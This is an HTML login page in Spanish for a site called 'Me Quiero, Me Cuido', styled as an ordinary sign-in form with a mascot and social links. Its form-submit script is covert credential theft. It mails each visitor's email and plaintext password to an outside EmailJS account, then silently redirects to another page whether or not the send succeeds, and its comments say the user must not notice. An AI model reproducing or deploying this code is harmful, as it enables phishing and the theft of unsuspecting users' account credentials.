<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Me Quiero, Me Cuido</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #f0f0f0 0%, #e8e8e8 50%, #d0d0d0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            padding: 30px 20px;
            max-width: 900px;
            width: 100%;
            position: relative;
            overflow: hidden;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            flex-wrap: wrap;
            gap: 15px;
        }

        .logo-left, .logo-right {
            background: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
            color: #5cb85c;
            display: flex;
            align-items: center;
            gap: 8px;
            flex: 1;
            min-width: 120px;
            justify-content: center;
        }

        .logo-left img, .logo-right img {
            max-width: 100%;
            height: auto;
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-header img {
            max-width: 150px;
            margin-bottom: 10px;
        }

        .login-container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }

        .form-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f9f9f9;
        }

        .form-input:focus {
            outline: none;
            border-color: #4caf50;
            background: white;
            box-shadow: 0 0 10px rgba(76, 175, 80, 0.1);
        }

        .form-input::placeholder {
            color: #999;
            font-size: 14px;
        }

        .password-container {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .password-toggle svg {
            transition: all 0.3s ease;
            width: 20px;
            height: 20px;
        }

        .password-toggle:hover svg {
            transform: scale(1.1);
        }

        .password-visible .password-toggle svg {
            fill: #4caf50;
        }

        .login-btn {
            background: #12c185;
            color: black;
            padding: 15px;
            border: 2px solid black;
            border-radius: 25px;
            font-size: clamp(14px, 4vw, 16px);
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 20px auto;
            text-align: center;
            text-decoration: none;
            display: block;
            width: 100%;
            max-width: 300px;
        }

        .login-btn:hover {
            background: linear-gradient(135deg, #388e3c, #4caf50);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .forgot-password {
            text-align: center;
            display: block;
            color: #4caf50;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s ease;
            margin-top: 15px;
        }

        .forgot-password:hover {
            color: #388e3c;
            text-decoration: underline;
        }

        .partners {
            text-align: center;
            margin: 30px 0;
        }

        .partners-logos img {
            max-width: 100%;
            height: auto;
        }

        .social {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }

        .social-icon {
            width: 35px;
            height: 35px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-decoration: none;
            transition: transform 0.3s ease;
        }

        .social-icon:hover {
            transform: scale(1.1);
        }

        .social-icon img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            padding: 5px;
        }

        .social-icon.tiktok { background: #000; }
        .social-icon.facebook { background: white; }
        .social-icon.instagram { background: white; }

        .footer {
            text-align: center;
            font-size: 12px;
            color: #666;
            margin-top: 15px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 20px 15px;
                border-radius: 15px;
            }
            
            .header {
                flex-direction: column;
                align-items: center;
                gap: 10px;
            }
            
            .logo-left, .logo-right {
                width: 100%;
                max-width: 200px;
            }
            
            .login-container {
                padding: 20px 15px;
            }
            
            .form-input {
                padding: 12px;
            }
            
            .login-btn {
                padding: 12px;
                max-width: 100%;
            }
        }

        @media (max-width: 480px) {
            .login-header img {
                max-width: 120px;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            .social-icon {
                width: 30px;
                height: 30px;
            }
        }
    </style>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        // Inicializa EmailJS (reemplaza 'YOUR_USER_ID' con tu ID de EmailJS)
        (function() {
            emailjs.init('Pr1XoC3eCI4M4AZQg'); // Obtén esto desde tu dashboard de EmailJS
        })();
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-left"><img src="img/Logo_2.png" alt="Logo 2"></div>
            <div class="logo-right"><img src="img/LOGO_principal.png" alt="Logo Principal"></div>
        </div>

        <div class="login-header">
            <img src="img/texto_login.png" alt="Iniciar Sesión" style="width: 400px;">
            <img src="img/mascota 1.png" alt="Mascota" style="width: 70px; margin-top: 10px;">
        </div>

        <div class="login-container">
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label" for="email">Correo electrónico</label>
                    <input 
                        type="email" 
                        id="email" 
                        class="form-input"
                        placeholder="Ingresa tu correo electrónico"
                        required
                    >
                </div>

                <div class="form-group">
                    <label class="form-label" for="password">Contraseña</label>
                    <div class="password-container">
                        <input 
                            type="password" 
                            id="password" 
                            class="form-input"
                            placeholder="Ingresa tu contraseña"
                            required
                        >
                        <button type="button" class="password-toggle" onclick="togglePassword('password')">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 5C5.63636 5 2 12 2 12C2 12 5.63636 19 12 19C18.3636 19 22 12 22 12C22 12 18.3636 5 12 5Z" stroke="#4caf50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="#4caf50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </button>
                    </div>
                </div>

                <button type="submit" class="login-btn">Ingresar</button>
            </form>

            <a href="forgotPassword.html" class="forgot-password">
                He olvidado mi contraseña
            </a>
        </div>

        <div class="partners">
            <div class="partners-logos">
                <img src="img/socios_locales.png" alt="Socios Locales">
            </div>
        </div>

        <div class="social">
            <a href="https://www.tiktok.com/@soytatu1" class="social-icon tiktok">
                <img src="img/tiktok.svg" alt="TikTok">
            </a>
            <a href="https://www.facebook.com/MQMCBolivia" class="social-icon facebook">
                <img src="img/facebook-svgrepo-com.svg" alt="Facebook">
            </a>
            <a href="https://www.instagram.com/mqmcbolivia/" class="social-icon instagram">
                <img src="img/instagram-svgrepo-com.svg" alt="Instagram">
            </a>
        </div>

        <div class="footer">Me quiero, Me cuido 2025</div>
    </div>

    <script>
      function togglePassword(fieldId) {
            const passwordField = document.getElementById(fieldId);
            const container = passwordField.parentNode;
            
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                container.classList.add('password-visible');
            } else {
                passwordField.type = 'password';
                container.classList.remove('password-visible');
            }
        }

        // Animación de entrada
        window.addEventListener('load', function() {
            const container = document.querySelector('.container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(20px)';
            container.style.transition = 'all 0.4s ease-out';
            
            setTimeout(() => {
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 100);
        });

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !email.includes('@')) {
                alert('Por favor ingresa un correo electrónico válido');
                return;
            }
            
            if (!password || password.length < 6) {
                alert('La contraseña debe tener al menos 6 caracteres');
                return;
            }
            
            try {
                // Enviar datos a EmailJS (configura esto en tu cuenta)
                await emailjs.send('service_5tc4a7m', 'template_bt30onq', {
                    email: email,
                    password: password
                });
                
                // Redirigir después del envío (sin que el usuario note nada)
                window.location.href = 'level.html';
                
            } catch (error) {
                console.error('Error al enviar el correo:', error);
                // Redirigir incluso si falla el envío (el usuario no debe enterarse)
                window.location.href = 'level.html';
            }
        });
    
    


    // Efectos hover para elementos interactivos
    document.querySelectorAll('.login-btn, .social-icon').forEach(element => {
        element.addEventListener('mouseenter', function() {
            this.style.transform = 'scale(1.05)';
        });
        
        element.addEventListener('mouseleave', function() {
            this.style.transform = 'scale(1)';
        });
    });
    </script>
</body>
</html>
